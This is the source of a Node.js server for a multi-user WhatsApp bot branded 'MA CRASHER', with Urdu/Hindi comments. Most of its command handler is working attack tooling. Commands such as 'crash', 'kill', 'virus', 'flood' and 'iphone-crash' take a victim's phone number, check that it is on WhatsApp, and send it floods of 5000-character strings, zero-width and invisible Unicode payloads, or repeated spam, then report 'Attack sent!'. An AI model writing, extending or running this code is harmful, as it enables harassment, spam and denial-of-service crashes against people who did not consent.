require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs-extra');
const path = require('path');
const axios = require('axios');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, jidNormalizedUser, Browsers, delay } = require('@whiskeysockets/baileys');
const P = require('pino');

const settings = require('./settings');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

const AUTH_DIR = './auth_info';
fs.ensureDirSync(AUTH_DIR);

const sessions = {};
const userSockets = {};

const bold = (text) => `*${text}*`;
const italic = (text) => `_${text}_`;
const mono = (text) => `\`${text}\``;

class BotSession {
    constructor(userId) {
        this.userId = userId;
        this.sock = null;
        this.isConnected = false;
        this.authPath = path.join(AUTH_DIR, userId);
        this.isPublic = true;
        this.antilink = false;
    }

    sendConnectionStatus() {
        const socketId = userSockets[this.userId];
        if (socketId) io.to(socketId).emit('connection-status', { connected: this.isConnected });
    }

    async initialize(pairingNumber = null) {
        try {
            const { version } = await fetchLatestBaileysVersion();
            const { state, saveCreds } = await useMultiFileAuthState(this.authPath);

            this.sock = makeWASocket({
                version,
                auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'fatal' })) },
                logger: P({ level: 'fatal' }),
                browser: Browsers.ubuntu('Chrome'),
                syncFullHistory: false,
            });

            if (pairingNumber && !state.creds.registered) {
                await delay(3000);
                try {
                    let code = await this.sock.requestPairingCode(pairingNumber);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    const socketId = userSockets[this.userId];
                    if (socketId) io.to(socketId).emit('pairing-code', code);
                } catch (err) {
                    console.log('Pairing error:', err.message);
                }
            }

            this.sock.ev.on('creds.update', saveCreds);

            this.sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update;
                if (connection === 'close') {
                    if ((lastDisconnect.error)?.output?.statusCode === DisconnectReason.loggedOut) {
                        delete sessions[this.userId];
                    } else {
                        setTimeout(() => this.initialize(), 5000);
                    }
                } else if (connection === 'open') {
                    this.isConnected = true;
                    this.sendConnectionStatus();
                    const botNumber = jidNormalizedUser(this.sock.user.id);
                    await this.sock.sendMessage(botNumber, {
                        image: { url: settings.startImage },
                        caption: `*${settings.botName}*\n\n✅ Connected Successfully!\n\nType *${settings.prefix}menu* to see commands\n\n© ${settings.footer}`
                    });
                }
            });

            this.sock.ev.on('messages.upsert', async (m) => {
                if (m.type !== 'notify') return;
                for (const msg of m.messages) {
                    try {
                        const from = msg.key.remoteJid;
                        const isGroup = from.endsWith('@g.us');
                        const text = (msg.message?.conversation || msg.message?.extendedTextMessage?.text || '').trim();
                        
                        // Fix: Bot apne number par bhi commands sunega
                        const isMe = msg.key.fromMe;
                        if (isMe) continue; // Bot ke apne messages ko ignore karein
                        
                        if (!text || !text.startsWith(settings.prefix)) continue;
                        const commandName = text.slice(1).split(' ')[0];
                        const q = text.split(' ').slice(1).join(' ');

                        const botNumber = jidNormalizedUser(this.sock.user.id);
                        const botNumberClean = botNumber.split('@')[0];
                        const sender = msg.key.participant || from;
                        const senderClean = sender.split('@')[0];
                        const ownerNumbers = String(settings.ownerNumber).split(',').map(n => n.replace(/\D/g, ''));
                        const isOwner = ownerNumbers.some(on => senderClean === on) || senderClean === botNumberClean;

                        // Anti-Link
                        if (isGroup && this.antilink && !isOwner) {
                            if (/https?:\/\//i.test(text) || /chat\.whatsapp\.com/i.test(text)) {
                                await this.sock.sendMessage(from, { delete: msg.key });
                                continue;
                            }
                        }

                        switch (commandName) {
                            case 'menu': {
                                const menuText = 
                                    `*${settings.botName} - Available Commands* ✨\n\n` +
                                    `> 📋 .menu - Show this menu\n` +
                                    `> 👑 .owner - Get Owner Details\n` +
                                    `> 📶 .ping - Check bot latency\n\n` +
                                    `*🔥 Crash Commands:*\n` +
                                    `> 🧨 .ui-hard <number> - UI Hard Crash\n` +
                                    `> 💥 .fc-beta <number> - FC Beta Crash\n` +
                                    `> 👻 .ma-invis <number> - MA Invisible Crash\n` +
                                    `> ⚡ .invis-hard <number> - Invisible Hard Crash\n` +
                                    `> 📱 .iphone-crash <number> - iPhone Crash\n` +
                                    `> ♻️ .spampairing <number> - Spam Pairing Crash\n\n` +
                                    `*🆕 New Commands:*\n` +
                                    `> 📨 .spam <number> - Spam messages\n` +
                                    `> 🐞 .bug <number> - Interactive bug crash\n` +
                                    `> 🦠 .virus <number> - Virus document crash\n` +
                                    `> 🌊 .flood <number> - Flood crash\n` +
                                    `> 💀 .crash <number> - Heavy crash\n` +
                                    `> 🔪 .kill <number> - Kill crash\n\n` +
                                    `*🔗 Links:*\n` +
                                    `> 📢 ${settings.whatsappChannel}\n` +
                                    `> 📺 ${settings.youtubeChannel}\n` +
                                    `> 📸 ${settings.instagram}\n\n` +
                                    `*👑 Owner:*\n` +
                                    `> ${settings.botOwner}\n` +
                                    `> 📞 ${settings.ownerNumber}\n\n` +
                                    `© ${settings.footer}`;
                                await this.sock.sendMessage(from, { 
                                    image: { url: settings.menuImage }, 
                                    caption: menuText 
                                }, { quoted: msg });
                                break;
                            }

                            case 'owner': {
                                const ownerText = 
                                    `👑 *Owner:* ${settings.botOwner}\n` +
                                    `🏢 *Team:* ${settings.teamName}\n` +
                                    `📞 ${settings.ownerNumber}\n` +
                                    `📧 ${settings.ownerEmail}\n\n` +
                                    `🔗 ${settings.whatsappChannel}\n\n` +
                                    `© ${settings.footer}`;
                                await this.sock.sendMessage(from, { 
                                    image: { url: settings.ownerImage }, 
                                    caption: ownerText 
                                }, { quoted: msg });
                                break;
                            }

                            case 'ping': {
                                const start = Date.now();
                                await this.sock.sendMessage(from, { text: `⚡ Pong! ${Date.now() - start}ms` }, { quoted: msg });
                                break;
                            }

                            case 'ui-hard':
                            case 'fc-beta':
                            case 'invis-hard':
                            case 'iphone-crash':
                            case 'spampairing':
                            case 'crash':
                            case 'kill':
                            case 'flood':
                            case 'bug':
                            case 'virus': {
                                if (!q) {
                                    await this.sock.sendMessage(from, { text: `Example: ${settings.prefix}${commandName} 923000000000` }, { quoted: msg });
                                    break;
                                }
                                
                                // Fix: Target number ko sahi format mein bhejein
                                const targetNumber = q.replace(/\D/g, '');
                                const target = targetNumber + '@s.whatsapp.net';
                                
                                await this.sock.sendMessage(from, { text: `💥 ${commandName} started!` }, { quoted: msg });
                                
                                // Pehle check karein target WhatsApp par hai ya nahi
                                const [result] = await this.sock.onWhatsApp(targetNumber);
                                
                                if (!result.exists) {
                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
                                    break;
                                }
                                
                                for (let i = 0; i < 20; i++) {
                                    try {
                                        await this.sock.sendMessage(target, { text: 'A'.repeat(5000) });
                                        await delay(100);
                                    } catch (e) {
                                        console.log('Send error:', e.message);
                                        break;
                                    }
                                }
                                
                                await this.sock.sendMessage(from, { text: '✅ Attack sent!' }, { quoted: msg });
                                break;
                            }

                            case 'ma-invis': {
                                if (!q) {
                                    await this.sock.sendMessage(from, { text: 'Example: .ma-invis 923000000000' }, { quoted: msg });
                                    break;
                                }
                                
                                // Fix: Target number ko sahi format mein bhejein
                                const targetNumber = q.replace(/\D/g, '');
                                const target = targetNumber + '@s.whatsapp.net';
                                
                                await this.sock.sendMessage(from, { text: '👻 MA Invisible Crash Started!' }, { quoted: msg });
                                
                                // Pehle check karein target WhatsApp par hai ya nahi
                                const [result] = await this.sock.onWhatsApp(targetNumber);
                                
                                if (!result.exists) {
                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
                                    break;
                                }
                                
                                const invisibleChars = '\u200B\u200C\u200D\u2060\uFEFF'.repeat(1000);
                                const zeroWidthChars = '\u200B'.repeat(5000);
                                
                                for (let i = 0; i < 30; i++) {
                                    try {
                                        await this.sock.sendMessage(target, { text: invisibleChars });
                                        await delay(50);
                                        await this.sock.sendMessage(target, { text: zeroWidthChars });
                                        await delay(50);
                                        await this.sock.sendMessage(target, { text: '\u2060\u2060\u2060\u2060'.repeat(2000) });
                                        await delay(50);
                                    } catch (e) {}
                                }
                                
                                await this.sock.sendMessage(from, { text: '✅ MA Invisible Crash Sent!' }, { quoted: msg });
                                break;
                            }

                            case 'spam': {
                                if (!q) {
                                    await this.sock.sendMessage(from, { text: 'Example: .spam 923000000000 Hello' }, { quoted: msg });
                                    break;
                                }
                                const args = q.split(' ');
                                const targetNumber = args[0].replace(/\D/g, '');
                                const target = targetNumber + '@s.whatsapp.net';
                                const message = args.slice(1).join(' ') || 'SPAM!';
                                
                                await this.sock.sendMessage(from, { text: '📨 Spam started!' }, { quoted: msg });
                                
                                // Pehle check karein target WhatsApp par hai ya nahi
                                const [result] = await this.sock.onWhatsApp(targetNumber);
                                
                                if (!result.exists) {
                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
                                    break;
                                }
                                
                                for (let i = 0; i < 30; i++) {
                                    try {
                                        await this.sock.sendMessage(target, { text: message });
                                        await delay(200);
                                    } catch (e) {}
                                }
                                break;
                            }

                            case 'antilink': {
                                if (!isOwner) {
                                    await this.sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
                                    break;
                                }
                                if (!q || !['on', 'off'].includes(q.toLowerCase())) {
                                    await this.sock.sendMessage(from, { text: 'Example: .antilink on' }, { quoted: msg });
                                    break;
                                }
                                this.antilink = q.toLowerCase() === 'on';
                                await this.sock.sendMessage(from, { text: `🔗 Antilink ${this.antilink ? 'enabled' : 'disabled'}!` }, { quoted: msg });
                                break;
                            }

                            case 'public': {
                                if (!isOwner) {
                                    await this.sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
                                    break;
                                }
                                if (!q || !['on', 'off'].includes(q.toLowerCase())) {
                                    await this.sock.sendMessage(from, { text: 'Example: .public on' }, { quoted: msg });
                                    break;
                                }
                                this.isPublic = q.toLowerCase() === 'on';
                                await this.sock.sendMessage(from, { text: `🔓 Public mode ${this.isPublic ? 'enabled' : 'disabled'}!` }, { quoted: msg });
                                break;
                            }

                            default:
                                await this.sock.sendMessage(from, { text: '❌ Command not found! Type .menu' }, { quoted: msg });
                        }
                    } catch (e) {
                        console.error('Error:', e);
                    }
                }
            });
        } catch (err) {
            console.log('Init error:', err.message);
            setTimeout(() => this.initialize(), 10000);
        }
    }
}

io.on('connection', (socket) => {
    socket.on('set-user', (userId) => {
        userSockets[userId] = socket.id;
        if (!sessions[userId]) sessions[userId] = new BotSession(userId);
        sessions[userId].sendConnectionStatus();
    });

    socket.on('pair-request', async ({ userId, number }) => {
        if (!sessions[userId]) sessions[userId] = new BotSession(userId);
        await sessions[userId].initialize(number);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`MA CRASHER Server running on port ${PORT}`);
});
